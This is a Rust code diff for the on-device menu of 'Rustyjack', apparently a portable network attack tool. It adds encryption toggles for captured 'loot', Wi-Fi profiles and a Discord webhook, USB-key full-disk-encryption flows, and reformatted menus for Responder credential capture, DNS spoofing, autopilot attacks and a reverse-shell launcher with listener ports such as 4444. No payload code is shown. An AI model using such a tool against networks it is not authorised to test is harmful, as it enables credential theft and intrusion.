+        let stdout = String::from_utf8_lossy(&output.stdout);
+        let mut devices = Vec::new();
+        for line in stdout.lines() {
+            let mut parts: Vec<String> = line.split_whitespace().map(|s| s.to_string()).collect();
+            if parts.len() < 4 {
+                continue;
+            }
+            let transport = parts.pop().unwrap_or_default();
+            let removable = parts.get(1).map(|s| s == "1").unwrap_or(false);
+            if !removable || !transport.eq_ignore_ascii_case("usb") {
+                continue;
+            }
+            let name = parts.get(0).cloned().unwrap_or_default();
+            let size = parts.get(2).cloned().unwrap_or_default();
+            let model = if parts.len() > 3 {
+                parts[3..].join(" ")
+            } else {
+                String::new()
+            };
+            devices.push(UsbDevice {
+                name,
+                size,
+                model: if model.is_empty() {
+                    "Unknown".to_string()
+                } else {
+                    model
+                },
+                transport,
+            });
+        }
+        Ok(devices)
+    }
+
+    /// Turn off all encryption toggles with a simple progress display.
+    fn disable_all_encryptions(&mut self) -> Result<()> {
+        let status = self.stats.snapshot();
+        let mut total_steps = 0usize;
+        if self.config.settings.encrypt_discord_webhook {
+            total_steps += 1;
+        }
+        if self.config.settings.encrypt_loot {
+            total_steps += 1;
+        }
+        if self.config.settings.encrypt_wifi_profiles {
+            total_steps += 1;
+        }
+        if total_steps == 0 {
+            total_steps = 1; // Avoid division by zero; still show completion
+        }
+        let mut current_step = 0usize;
+
+        // Step 1: webhook encryption
+        if self.config.settings.encrypt_discord_webhook {
+            current_step += 1;
+            let pct = (current_step as f32 / total_steps as f32) * 100.0;
+            self.display.draw_progress_dialog(
+                "Encryption",
+                "Disabling webhook encryption...\nDo not power off\nUncancellable",
+                pct,
+                &status,
+            )?;
+            let _ = self.set_webhook_encryption(false, false);
+        }
+
+        // Step 2: loot encryption
+        if self.config.settings.encrypt_loot {
+            current_step += 1;
+            let pct = (current_step as f32 / total_steps as f32) * 100.0;
+            self.display.draw_progress_dialog(
+                "Encryption",
+                "Disabling loot encryption...\nDo not power off\nUncancellable",
+                pct,
+                &status,
+            )?;
+            let _ = self.set_loot_encryption(false, false);
+        }
+
+        // Step 2: Wi-Fi profile encryption
+        if self.config.settings.encrypt_wifi_profiles {
+            current_step += 1;
+            let pct = (current_step as f32 / total_steps as f32) * 100.0;
+            self.display.draw_progress_dialog(
+                "Encryption",
+                "Disabling Wi-Fi profile encryption...\nDo not power off\nUncancellable",
+                pct,
+                &status,
+            )?;
+            let _ = self.set_wifi_encryption(false, false);
+        }
+
+        // Final message
+        self.display.draw_progress_dialog(
+            "Encryption",
+            "All encryption toggles set to OFF\nDo not power off\nUncancellable",
+            100.0,
+            &status,
+        )?;
+
+        // Ensure flags are off
+        self.config.settings.encrypt_discord_webhook = false;
+        self.config.settings.encrypt_loot = false;
+        self.config.settings.encrypt_wifi_profiles = false;
+        rustyjack_encryption::set_wifi_profile_encryption(false);
+        rustyjack_encryption::set_loot_encryption(false);
+        let _ = self.config.save(&self.root.join("gui_conf.json"));
+        clear_encryption_key();
+        Ok(())
+    }
+
+    fn toggle_encrypt_wifi_profiles(&mut self) -> Result<()> {
+        self.set_wifi_encryption(!self.config.settings.encrypt_wifi_profiles, true)
+    }
+
+    fn set_wifi_encryption(&mut self, enable: bool, interactive: bool) -> Result<()> {
+        if enable && !self.config.settings.encryption_enabled {
+            return self.show_message(
+                "Encryption",
+                ["Enable master encryption first", "Toggle Encryption [ON]"],
+            );
+        }
+        if !self.ensure_keyfile_available() {
+            return Ok(());
+        }
+
+        if interactive {
+            let prompt = if enable {
+                "Encrypt saved Wi-Fi profiles with the current key?"
+            } else {
+                "Decrypt Wi-Fi profiles to plaintext?"
+            };
+            let options = vec!["Proceed".to_string(), "Cancel".to_string()];
+            if self.choose_from_list(prompt, &options)? != Some(0) {
+                clear_encryption_key();
+                return Ok(());
+            }
+        }
+
+        let profiles_dir = self.root.join("wifi").join("profiles");
+        if enable {
+            let _ = fs::create_dir_all(&profiles_dir);
+        }
+
+        let mut changed = 0usize;
+        let mut errors: Vec<String> = Vec::new();
+
+        if profiles_dir.exists() {
+            if let Ok(entries) = fs::read_dir(&profiles_dir) {
+                for entry in entries.flatten() {
+                    let path = entry.path();
+                    if !path.is_file() {
+                        continue;
+                    }
+                    let name = path
+                        .file_name()
+                        .and_then(|s| s.to_str())
+                        .unwrap_or_default()
+                        .to_string();
+
+                    if enable {
+                        if path.extension().and_then(|e| e.to_str()) != Some("json") {
+                            continue;
+                        }
+                        match fs::read_to_string(&path) {
+                            Ok(mut contents) => {
+                                let dest = path.with_file_name(format!("{name}.enc"));
+                                if let Err(e) = rustyjack_encryption::encrypt_to_file(
+                                    &dest,
+                                    contents.as_bytes(),
+                                ) {
+                                    errors.push(shorten_for_display(&e.to_string(), 80));
+                                } else {
+                                    let _ = fs::remove_file(&path);
+                                    changed += 1;
+                                }
+                                contents.zeroize();
+                            }
+                            Err(e) => errors.push(shorten_for_display(&e.to_string(), 80)),
+                        }
+                    } else {
+                        if path.extension().and_then(|e| e.to_str()) != Some("enc") {
+                            continue;
+                        }
+                        match rustyjack_encryption::decrypt_file(&path) {
+                            Ok(mut bytes) => {
+                                let plain_name = name.trim_end_matches(".enc");
+                                let dest = path.with_file_name(plain_name);
+                                if let Err(e) = fs::write(&dest, &bytes) {
+                                    errors.push(shorten_for_display(&e.to_string(), 80));
+                                } else {
+                                    let _ = fs::remove_file(&path);
+                                    changed += 1;
+                                }
+                                bytes.zeroize();
+                            }
+                            Err(e) => errors.push(shorten_for_display(&e.to_string(), 80)),
+                        }
+                    }
+                }
+            }
+        }
+
+        self.config.settings.encrypt_wifi_profiles = enable;
+        rustyjack_encryption::set_wifi_profile_encryption(self.wifi_encryption_active());
+        let _ = self.config.save(&self.root.join("gui_conf.json"));
+
+        if interactive {
+            if errors.is_empty() {
+                let res = self.show_message(
+                    "Encryption",
+                    [format!(
+                        "Wi-Fi profiles encryption {} ({} file{})",
+                        if enable { "ENABLED" } else { "DISABLED" },
+                        changed,
+                        if changed == 1 { "" } else { "s" }
+                    )],
+                );
+                clear_encryption_key();
+                return res;
+            }
+            let res = self.show_message(
+                "Encryption",
+                [
+                    "Completed with errors",
+                    &shorten_for_display(&errors.join("; "), 90),
+                ],
+            );
+            clear_encryption_key();
+            return res;
+        }
+
+        clear_encryption_key();
+        Ok(())
+    }
+
+    fn toggle_encrypt_loot(&mut self) -> Result<()> {
+        self.set_loot_encryption(!self.config.settings.encrypt_loot, true)
+    }
+
+    fn set_loot_encryption(&mut self, enable: bool, interactive: bool) -> Result<()> {
+        if enable && !self.config.settings.encryption_enabled {
+            return self.show_message(
+                "Encryption",
+                ["Enable encryption first", "Toggle master Encryption ON"],
+            );
+        }
+        if !self.ensure_keyfile_available() {
+            return Ok(());
+        }
+
+        if interactive {
+            let prompt = if enable {
+                "Encrypt all loot files with the current key?"
+            } else {
+                "Decrypt all loot files (uncancellable)?"
+            };
+            let options = vec!["Proceed".to_string(), "Cancel".to_string()];
+            if self.choose_from_list(prompt, &options)? != Some(0) {
+                clear_encryption_key();
+                return Ok(());
+            }
+        }
+
+        let targets = vec![
+            self.root.join("loot"),
+            self.root.join("Responder").join("logs"),
+        ];
+        let mut files = Vec::new();
+
+        for dir in targets {
+            if !dir.exists() {
+                continue;
+            }
+            for entry in WalkDir::new(&dir) {
+                let entry = match entry {
+                    Ok(e) => e,
+                    Err(_) => continue,
+                };
+                if !entry.file_type().is_file() {
+                    continue;
+                }
+                let path = entry.path().to_path_buf();
+                let name = match path.file_name().and_then(|s| s.to_str()) {
+                    Some(n) => n,
+                    None => continue,
+                };
+                if enable {
+                    if name.ends_with(".enc") {
+                        continue;
+                    }
+                } else if !name.ends_with(".enc") {
+                    continue;
+                }
+                files.push(path);
+            }
+        }
+
+        let total = files.len();
+        let status = self.stats.snapshot();
+        let mut errors: Vec<String> = Vec::new();
+        if total == 0 && interactive {
+            clear_encryption_key();
+            return self.show_message(
+                "Encryption",
+                [if enable {
+                    "No plaintext loot files found"
+                } else {
+                    "No encrypted loot files found"
+                }],
+            );
+        }
+
+        for (idx, path) in files.iter().enumerate() {
+            let progress = ((idx + 1) as f32 / total.max(1) as f32) * 100.0;
+            let msg = if enable {
+                "Encrypting loot...\nDo not power off"
+            } else {
+                "Decrypting loot...\nDo not power off"
+            };
+            self.display
+                .draw_progress_dialog("Encryption", msg, progress, &status)?;
+
+            if enable {
+                let mut data = match fs::read(&path) {
+                    Ok(d) => d,
+                    Err(e) => {
+                        errors.push(shorten_for_display(&e.to_string(), 80));
+                        continue;
+                    }
+                };
+                let filename = path.file_name().and_then(|s| s.to_str()).unwrap_or("file");
+                let dest = path.with_file_name(format!("{filename}.enc"));
+                if dest.exists() {
+                    let _ = fs::remove_file(&dest);
+                }
+                if let Err(e) = rustyjack_encryption::encrypt_to_file(&dest, &data) {
+                    errors.push(shorten_for_display(&e.to_string(), 80));
+                } else {
+                    let _ = fs::remove_file(&path);
+                }
+                data.zeroize();
+            } else {
+                let filename = path
+                    .file_name()
+                    .and_then(|s| s.to_str())
+                    .unwrap_or_default();
+                let plain_name = filename.trim_end_matches(".enc");
+                let dest = path.with_file_name(plain_name);
+                if dest.exists() {
+                    errors.push(format!(
+                        "Plaintext exists, skip: {}",
+                        shorten_for_display(dest.to_string_lossy().as_ref(), 40)
+                    ));
+                    continue;
+                }
+                match rustyjack_encryption::decrypt_file(&path) {
+                    Ok(mut data) => {
+                        if let Err(e) = fs::write(&dest, &data) {
+                            errors.push(shorten_for_display(&e.to_string(), 80));
+                        } else {
+                            let _ = fs::remove_file(&path);
+                        }
+                        data.zeroize();
+                    }
+                    Err(e) => errors.push(shorten_for_display(&e.to_string(), 80)),
+                }
+            }
+        }
+
+        self.config.settings.encrypt_loot = enable;
+        rustyjack_encryption::set_loot_encryption(self.loot_encryption_active());
+        let _ = self.config.save(&self.root.join("gui_conf.json"));
+
+        if interactive {
+            if errors.is_empty() {
+                let res = self.show_message(
+                    "Encryption",
+                    [format!(
+                        "Loot encryption {}",
+                        if enable { "ENABLED" } else { "DISABLED" }
+                    )],
+                );
+                clear_encryption_key();
+                return res;
+            }
+            let res = self.show_message(
+                "Encryption",
+                [
+                    "Completed with errors",
+                    &shorten_for_display(&errors.join("; "), 90),
+                ],
+            );
+            clear_encryption_key();
+            return res;
+        }
+        clear_encryption_key();
+        Ok(())
+    }
+
+    fn toggle_encrypt_webhook(&mut self) -> Result<()> {
+        self.set_webhook_encryption(!self.config.settings.encrypt_discord_webhook, true)
+    }
+
+    /// UI flow for full disk encryption USB preparation.
+    fn start_full_disk_encryption_flow(&mut self) -> Result<()> {
+        self.show_message(
+            "Full Disk Encryption",
+            [
+                "WARNING:",
+                "Will require formatting a USB key for unlock",
+                "and re-encrypting the SD root; power loss can brick.",
+            ],
+        )?;
+        let proceed_opts = vec![
+            "Proceed to device selection".to_string(),
+            "Cancel".to_string(),
+        ];
+        if self
+            .choose_from_list("Continue?", &proceed_opts)?
+            .map(|i| i != 0)
+            .unwrap_or(true)
+        {
+            return Ok(());
+        }
+
+        let devices = match self.list_usb_devices() {
+            Ok(d) => d,
+            Err(e) => {
+                return self.show_message(
+                    "Full Disk Encryption",
+                    [
+                        "Failed to list USB devices",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                );
+            }
+        };
+        if devices.is_empty() {
+            return self.show_message(
+                "Full Disk Encryption",
+                [
+                    "No removable USB devices detected",
+                    "Insert USB key and retry",
+                ],
+            );
+        }
+
+        let labels: Vec<String> = devices
+            .iter()
+            .map(|d| format!("{}  {}  {}", d.name, d.size, d.model))
+            .collect();
+        let Some(choice) = self.choose_from_list("Select USB to format (will wipe)", &labels)?
+        else {
+            return Ok(());
+        };
+        let dev = &devices[choice];
+        let confirm_opts = vec![
+            format!("Format {} ({})", dev.name, dev.size),
+            "Cancel".to_string(),
+        ];
+        if self
+            .choose_from_list("Final confirmation", &confirm_opts)?
+            .map(|i| i != 0)
+            .unwrap_or(true)
+        {
+            return Ok(());
+        }
+
+        self.run_usb_prepare(&dev.name)
+    }
+
+    fn start_fde_migration(&mut self) -> Result<()> {
+        let target_prompt = vec!["Enter target device (e.g., /dev/mmcblk0p3)".to_string()];
+        let target = match self.prompt_input("Encrypted Root Target", &target_prompt)? {
+            Some(t) => t,
+            None => return Ok(()),
+        };
+        let key_prompt = vec!["Enter keyfile path (e.g., /mnt/usb/rustyjack.key)".to_string()];
+        let keyfile = match self.prompt_input("Keyfile", &key_prompt)? {
+            Some(t) => t,
+            None => return Ok(()),
+        };
+
+        let confirm_migrate = vec![
+            "Dry run (safe)".to_string(),
+            "Run migration (destructive)".to_string(),
+            "Cancel".to_string(),
+        ];
+        let choice = self.choose_from_list("Migration mode", &confirm_migrate)?;
+        let execute = match choice {
+            Some(0) => false,
+            Some(1) => true,
+            _ => return Ok(()),
+        };
+
+        self.run_fde_migrate(&target, &keyfile, execute)
+    }
+
+    fn run_usb_prepare(&mut self, device: &str) -> Result<()> {
+        let script = self.root.join("scripts").join("fde_prepare_usb.sh");
+        if !script.exists() {
+            return self.show_message(
+                "Full Disk Encryption",
+                [
+                    "Missing script",
+                    &shorten_for_display(&script.to_string_lossy(), 36),
+                ],
+            );
+        }
+
+        let mut cmd = Command::new("bash");
+        cmd.arg(&script)
+            .arg(device)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped());
+
+        let mut child = match cmd.spawn() {
+            Ok(c) => c,
+            Err(e) => {
+                return self.show_message(
+                    "Full Disk Encryption",
+                    ["Failed to start", &shorten_for_display(&e.to_string(), 90)],
+                );
+            }
+        };
+
+        let status = self.stats.snapshot();
+        let mut step = 0usize;
+        let total_steps = 6usize; // unmount, wipe, partition, mkfs, key, sync
+        let mut stdout_lines: Vec<String> = Vec::new();
+
+        if let Some(stdout) = child.stdout.take() {
+            let reader = std::io::BufReader::new(stdout);
+            for line in reader.lines().flatten() {
+                stdout_lines.push(line.clone());
+                step = (step + 1).min(total_steps);
+                let progress = ((step as f32 / total_steps as f32) * 100.0).min(95.0);
+                self.display.draw_progress_dialog(
+                    "Full Disk Encryption",
+                    "Preparing USB key...\nDo not remove power/USB",
+                    progress,
+                    &status,
+                )?;
+            }
+        }
+
+        let stderr = if let Some(mut err) = child.stderr.take() {
+            let mut buf = String::new();
+            let _ = err.read_to_string(&mut buf);
+            buf
+        } else {
+            String::new()
+        };
+
+        let exit = child.wait();
+
+        self.display.draw_progress_dialog(
+            "Full Disk Encryption",
+            "Finishing...",
+            100.0,
+            &status,
+        )?;
+
+        match exit {
+            Ok(status_code) if status_code.success() => {
+                let mut to_show: Vec<String> = stdout_lines
+                    .iter()
+                    .map(|l| shorten_for_display(l, 32))
+                    .collect();
+                if to_show.is_empty() {
+                    to_show.push("USB prepared".to_string());
+                }
+                self.show_message("Full Disk Encryption", to_show)
+            }
+            Ok(status_code) => {
+                let msg = if !stderr.trim().is_empty() {
+                    shorten_for_display(stderr.trim(), 90)
+                } else {
+                    format!("Script failed: {status_code}")
+                };
+                self.show_message("Full Disk Encryption", [msg])
+            }
+            Err(e) => self.show_message(
+                "Full Disk Encryption",
+                ["Process error", &shorten_for_display(&e.to_string(), 90)],
+            ),
+        }
+    }
+    fn run_fde_migrate(&mut self, target: &str, keyfile: &str, execute: bool) -> Result<()> {
+        let script = self.root.join("scripts").join("fde_migrate_root.sh");
+        if !script.exists() {
+            return self.show_message(
+                "Full Disk Encryption",
+                [
+                    "Missing script",
+                    &shorten_for_display(&script.to_string_lossy(), 36),
+                ],
+            );
+        }
+
+        let mut cmd = Command::new("bash");
+        cmd.arg(&script)
+            .arg("--target")
+            .arg(target)
+            .arg("--keyfile")
+            .arg(keyfile)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped());
+        if execute {
+            cmd.arg("--execute");
+        }
+
+        let mut child = match cmd.spawn() {
+            Ok(c) => c,
+            Err(e) => {
+                return self.show_message(
+                    "Full Disk Encryption",
+                    ["Failed to start", &shorten_for_display(&e.to_string(), 90)],
+                );
+            }
+        };
+
+        let status = self.stats.snapshot();
+        let mut progress: f32 = 0.0;
+
+        if let Some(stdout) = child.stdout.take() {
+            let reader = std::io::BufReader::new(stdout);
+            for line in reader.lines().flatten() {
+                if let Some(rest) = line.strip_prefix("PROGRESS ") {
+                    if let Ok(val) = rest.trim().parse::<f32>() {
+                        progress = val.min(99.0);
+                    }
+                }
+                self.display.draw_progress_dialog(
+                    "Full Disk Encryption",
+                    "Migrating root...
+Do not remove power/USB",
+                    progress,
+                    &status,
+                )?;
+            }
+        }
+
+        let stderr = if let Some(mut err) = child.stderr.take() {
+            let mut buf = String::new();
+            let _ = err.read_to_string(&mut buf);
+            buf
+        } else {
+            String::new()
+        };
+
+        let exit = child.wait();
+        self.display.draw_progress_dialog(
+            "Full Disk Encryption",
+            "Finishing...",
+            100.0,
+            &status,
+        )?;
+
+        match exit {
+            Ok(code) if code.success() => self.show_message(
+                "Full Disk Encryption",
+                [if execute {
+                    "Migration completed".to_string()
+                } else {
+                    "Dry run completed".to_string()
+                }],
+            ),
+            Ok(code) => {
+                let msg = if !stderr.trim().is_empty() {
+                    shorten_for_display(stderr.trim(), 90)
+                } else {
+                    format!("Script failed: {code}")
+                };
+                self.show_message("Full Disk Encryption", [msg])
+            }
+            Err(e) => self.show_message(
+                "Full Disk Encryption",
+                ["Process error", &shorten_for_display(&e.to_string(), 90)],
+            ),
+        }
+    }
+
+    fn set_webhook_encryption(&mut self, enable: bool, show_msg: bool) -> Result<()> {
+        if enable && !self.config.settings.encryption_enabled {
+            return self.show_message(
+                "Encryption",
+                ["Enable encryption first", "Toggle master encryption ON"],
+            );
+        }
+        if !self.ensure_keyfile_available() {
+            return Ok(());
+        }
+
+        let plain = self.root.join("discord_webhook.txt");
+        let enc = self.root.join("discord_webhook.txt.enc");
+
+        if enable {
+            self.config.settings.encrypt_discord_webhook = true;
+            if plain.exists() {
+                if let Ok(content) = fs::read(&plain) {
+                    let _ = rustyjack_encryption::encrypt_to_file(&enc, &content);
+                    let mut content_mut = content.clone();
+                    content_mut.zeroize();
+                    let _ = fs::remove_file(&plain);
+                }
+            }
+        } else {
+            self.config.settings.encrypt_discord_webhook = false;
+            if enc.exists() {
+                if let Ok(bytes) = rustyjack_encryption::decrypt_file(&enc) {
+                    let _ = fs::write(&plain, &bytes);
+                    let mut tmp = bytes.clone();
+                    tmp.zeroize();
+                    let mut bytes_mut = bytes;
+                    bytes_mut.zeroize();
+                }
+            }
+        }
+
+        let _ = self.config.save(&self.root.join("gui_conf.json"));
+        if show_msg {
+            let res = self.show_message(
+                "Encryption",
+                [format!(
+                    "Webhook encryption {}",
+                    if self.config.settings.encrypt_discord_webhook {
+                        "ENABLED"
+                    } else {
+                        "DISABLED"
+                    }
+                )],
+            );
+            clear_encryption_key();
+            return res;
+        }
+        clear_encryption_key();
         Ok(())
     }
 
@@ -1918,6 +3376,154 @@ impl App {
         )?;
 
         Ok(())
+    }
+
+    /// Browse a USB drive and let the user pick a file. Returns None on cancel.
+    fn browse_usb_for_file(
+        &mut self,
+        title: &str,
+        allowed_ext: Option<&[&str]>,
+    ) -> Result<Option<PathBuf>> {
+        let usb_root = match self.find_usb_mount() {
+            Ok(p) => p,
+            Err(_) => {
+                self.show_message(
+                    "USB",
+                    ["No USB drive detected", "Insert a USB drive and retry"],
+                )?;
+                return Ok(None);
+            }
+        };
+
+        let mut current = usb_root.clone();
+        let mut stack: Vec<PathBuf> = Vec::new();
+        let mut selection: usize = 0;
+
+        loop {
+            let mut entries: Vec<(String, PathBuf, bool)> = Vec::new();
+            if let Ok(read) = fs::read_dir(&current) {
+                for entry in read.flatten() {
+                    let path = entry.path();
+                    let is_dir = path.is_dir();
+                    let name = entry.file_name().to_string_lossy().to_string();
+                    entries.push((name, path, is_dir));
+                }
+            }
+            // Sort dirs first, then files
+            entries.sort_by(|a, b| {
+                b.2.cmp(&a.2)
+                    .then_with(|| a.0.to_lowercase().cmp(&b.0.to_lowercase()))
+            });
+
+            // Build labels
+            let mut labels: Vec<String> = if entries.is_empty() {
+                vec!["<empty directory>".to_string()]
+            } else {
+                entries
+                    .iter()
+                    .map(|(name, _, is_dir)| {
+                        if *is_dir {
+                            format!("[DIR] {}", name)
+                        } else {
+                            name.clone()
+                        }
+                    })
+                    .collect()
+            };
+
+            selection = selection.min(labels.len().saturating_sub(1));
+
+            let path_label = shorten_for_display(current.to_string_lossy().as_ref(), 18);
+            let status = self.stats.snapshot();
+            self.display.draw_menu(
+                &format!("{title} ({path_label})"),
+                &labels,
+                selection,
+                &status,
+            )?;
+
+            let button = self.buttons.wait_for_press()?;
+            match self.map_button(button) {
+                ButtonAction::Up => {
+                    if selection == 0 {
+                        selection = labels.len().saturating_sub(1);
+                    } else {
+                        selection -= 1;
+                    }
+                }
+                ButtonAction::Down => {
+                    selection = (selection + 1) % labels.len().max(1);
+                }
+                ButtonAction::Select => {
+                    if entries.is_empty() {
+                        continue;
+                    }
+                    let (name, path, is_dir) = &entries[selection];
+                    if *is_dir {
+                        stack.push(current.clone());
+                        current = path.clone();
+                        selection = 0;
+                        continue;
+                    } else {
+                        // Only allow configured file types if provided
+                        if let Some(allowed) = allowed_ext {
+                            let ext_ok = path
+                                .extension()
+                                .and_then(|e| e.to_str())
+                                .map(|e| allowed.iter().any(|a| e.eq_ignore_ascii_case(a)))
+                                .unwrap_or(false);
+                            if !ext_ok {
+                                self.show_message(
+                                    "USB",
+                                    [
+                                        "Unsupported file type",
+                                        &format!("{}", shorten_for_display(name, 18)),
+                                        &format!("Allowed: {}", allowed.join(", ")),
+                                    ],
+                                )?;
+                                continue;
+                            }
+                        }
+
+                        let confirm_opts = vec![
+                            format!("Use {}", shorten_for_display(name, 18)),
+                            "Cancel".to_string(),
+                        ];
+                        if let Some(choice) = self.choose_from_list("Load file?", &confirm_opts)? {
+                            if choice == 0 {
+                                return Ok(Some(path.clone()));
+                            }
+                        }
+                    }
+                }
+                ButtonAction::Back => {
+                    if let Some(prev) = stack.pop() {
+                        current = prev;
+                        selection = 0;
+                    } else {
+                        let opts = vec!["Cancel import".to_string(), "Stay".to_string()];
+                        if let Some(choice) = self.choose_from_list("Exit USB import?", &opts)? {
+                            if choice == 0 {
+                                return Ok(None);
+                            }
+                        }
+                    }
+                }
+                ButtonAction::MainMenu => {
+                    let opts = vec!["Go to Main Menu".to_string(), "Stay".to_string()];
+                    if let Some(choice) = self.choose_from_list("Leave USB browser?", &opts)? {
+                        if choice == 0 {
+                            self.menu_state.home();
+                            return Ok(None);
+                        }
+                    }
+                }
+                ButtonAction::Reboot => {
+                    self.confirm_reboot()?;
+                }
+                ButtonAction::Refresh => {}
+            }
+        }
     }
 
     fn find_usb_mount(&self) -> Result<PathBuf> {
@@ -2364,9 +3970,9 @@ impl App {
                                             [format!("Failed to save: {}", e)],
                                         )?;
                                     } else {
-                                        if let Err(e) = self.apply_interface_isolation(
-                                            &[interface_name.clone()],
-                                        ) {
+                                        if let Err(e) = self
+                                            .apply_interface_isolation(&[interface_name.clone()])
+                                        {
                                             lines.push(format!("Isolation failed: {}", e));
                                         }
                                         if let Some(route_msg) =
@@ -2509,10 +4115,7 @@ impl App {
                 lines.push("".to_string());
                 lines.push("Stop it first, then".to_string());
                 lines.push("start a new run.".to_string());
-                return self.show_message(
-                    "Autopilot",
-                    lines.iter().map(|s| s.as_str()),
-                );
+                return self.show_message("Autopilot", lines.iter().map(|s| s.as_str()));
             }
         }
 
@@ -2535,21 +4138,13 @@ impl App {
         let confirm_lines = vec![
             format!("Mode: {}", mode_label),
             format!("Interface: {}", active_interface),
-            format!(
-                "DNS spoof: {}",
-                dns_choice.as_deref().unwrap_or("None")
-            ),
+            format!("DNS spoof: {}", dns_choice.as_deref().unwrap_or("None")),
             "".to_string(),
             "Start autopilot?".to_string(),
         ];
-        self.show_message(
-            "Autopilot",
-            confirm_lines.iter().map(|s| s.as_str()),
-        )?;
-        let confirm = self.choose_from_list(
-            "Confirm",
-            &["Start".to_string(), "Cancel".to_string()],
-        )?;
+        self.show_message("Autopilot", confirm_lines.iter().map(|s| s.as_str()))?;
+        let confirm =
+            self.choose_from_list("Confirm", &["Start".to_string(), "Cancel".to_string()])?;
         if confirm != Some(0) {
             return Ok(());
         }
@@ -2591,17 +4186,17 @@ impl App {
                 ));
                 lines.push("".to_string());
                 lines.push("Toolbar shows AP status.".to_string());
-                self.show_message(
-                    "Autopilot",
-                    lines.iter().map(|s| s.as_str()),
-                )
+                self.show_message("Autopilot", lines.iter().map(|s| s.as_str()))
             }
             Err(e) => self.show_message("Autopilot", [format!("Start failed: {}", e)]),
         }
     }
 
     fn stop_autopilot(&mut self) -> Result<()> {
-        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Stop)) {
+        match self
+            .core
+            .dispatch(Commands::Autopilot(AutopilotCommand::Stop))
+        {
             Ok((msg, _)) => self.show_message("Autopilot", [msg]),
             Err(e) => self.show_message("Autopilot", [format!("Stop failed: {}", e)]),
         }
@@ -2623,7 +4218,10 @@ impl App {
                 "Stop via Responder Off.",
             ],
         )?;
-        let confirm = self.choose_from_list("Start Responder?", &["Start".to_string(), "Cancel".to_string()])?;
+        let confirm = self.choose_from_list(
+            "Start Responder?",
+            &["Start".to_string(), "Cancel".to_string()],
+        )?;
         if confirm != Some(0) {
             return Ok(());
         }
@@ -2637,14 +4235,21 @@ impl App {
         {
             Ok((msg, _)) => self.show_message(
                 "Responder",
-                [msg, format!("Interface: {}", iface), "Loot: Responder/logs".to_string()],
+                [
+                    msg,
+                    format!("Interface: {}", iface),
+                    "Loot: Responder/logs".to_string(),
+                ],
             ),
             Err(e) => self.show_message("Responder", [format!("Start failed: {}", e)]),
         }
     }
 
     fn stop_responder(&mut self) -> Result<()> {
-        match self.core.dispatch(Commands::Responder(ResponderCommand::Off)) {
+        match self
+            .core
+            .dispatch(Commands::Responder(ResponderCommand::Off))
+        {
             Ok((msg, _)) => self.show_message("Responder", [msg]),
             Err(e) => self.show_message("Responder", [format!("Stop failed: {}", e)]),
         }
@@ -3246,12 +4851,9 @@ impl App {
                             lines.push("Captured Domains:".to_string());
                             lines.push("".to_string());
                             for query in queries.iter().take(50) {
-                                if let Some(domain) =
-                                    query.get("domain").and_then(|d| d.as_str())
-                                {
+                                if let Some(domain) = query.get("domain").and_then(|d| d.as_str()) {
                                     let short_domain = shorten_for_display(domain, 20);
-                                    if let Some(qtype) =
-                                        query.get("type").and_then(|t| t.as_str())
+                                    if let Some(qtype) = query.get("type").and_then(|t| t.as_str())
                                     {
                                         lines.push(format!("{} ({})", short_domain, qtype));
                                     } else {
@@ -3293,7 +4895,9 @@ impl App {
             );
         }
         let choice = self.choose_dnsspoof_site(&sites)?;
-        let Some(site) = choice else { return Ok(()); };
+        let Some(site) = choice else {
+            return Ok(());
+        };
 
         self.show_message(
             "DNS Spoof",
@@ -3306,7 +4910,10 @@ impl App {
                 "Stop via Stop DNS Spoof.",
             ],
         )?;
-        let confirm = self.choose_from_list("Start DNS Spoof?", &["Start".to_string(), "Cancel".to_string()])?;
+        let confirm = self.choose_from_list(
+            "Start DNS Spoof?",
+            &["Start".to_string(), "Cancel".to_string()],
+        )?;
         if confirm != Some(0) {
             return Ok(());
         }
@@ -3358,7 +4965,10 @@ impl App {
                 "Press Start to continue.",
             ],
         )?;
-        let cont = self.choose_from_list("Launch shell?", &["Start".to_string(), "Cancel".to_string()])?;
+        let cont = self.choose_from_list(
+            "Launch shell?",
+            &["Start".to_string(), "Cancel".to_string()],
+        )?;
         if cont != Some(0) {
             return Ok(());
         }
@@ -3373,17 +4983,19 @@ impl App {
                 _ => "Target",
             };
             let part = self.prompt_octet(prefix)?;
-            let Some(val) = part else { return Ok(()); };
+            let Some(val) = part else {
+                return Ok(());
+            };
             octets.push(val);
         }
-        let target_ip = format!(
-            "{}.{}.{}.{}",
-            octets[0], octets[1], octets[2], octets[3]
-        );
+        let target_ip = format!("{}.{}.{}.{}", octets[0], octets[1], octets[2], octets[3]);
 
         // Prompt for port (common choices)
         let ports = vec!["4444", "9001", "1337", "5555"];
-        let port_choice = self.choose_from_list("LPORT", &ports.iter().map(|s| s.to_string()).collect::<Vec<_>>())?;
+        let port_choice = self.choose_from_list(
+            "LPORT",
+            &ports.iter().map(|s| s.to_string()).collect::<Vec<_>>(),
+        )?;
         let port: u16 = port_choice
             .and_then(|idx| ports.get(idx))
             .and_then(|p| p.parse().ok())
@@ -3413,7 +5025,6 @@ impl App {
         }
     }
 
-
     fn show_autopilot_status(&mut self) -> Result<()> {
         match self
             .core
@@ -3424,14 +5035,8 @@ impl App {
                     .get("running")
                     .and_then(|v| v.as_bool())
                     .unwrap_or(false);
-                let mode = data
-                    .get("mode")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or("none");
-                let phase = data
-                    .get("phase")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or("idle");
+                let mode = data.get("mode").and_then(|v| v.as_str()).unwrap_or("none");
+                let phase = data.get("phase").and_then(|v| v.as_str()).unwrap_or("idle");
                 let elapsed = data
                     .get("elapsed_secs")
                     .and_then(|v| v.as_u64())
@@ -3747,7 +5352,8 @@ impl App {
             }));
 
             let r = core.dispatch(command);
-            *result_clone.lock()
+            *result_clone
+                .lock()
                 .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))
                 .unwrap_or_else(|_| panic!("Failed to lock result mutex")) = Some(r);
         });
@@ -3776,9 +5382,11 @@ impl App {
             }
 
             // Check if attack completed
-            if result.lock()
+            if result
+                .lock()
                 .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))?
-                .is_some() {
+                .is_some()
+            {
                 break;
             }
 
@@ -3828,7 +5436,8 @@ impl App {
         }
 
         // Get result
-        let attack_result = result.lock()
+        let attack_result = result
+            .lock()
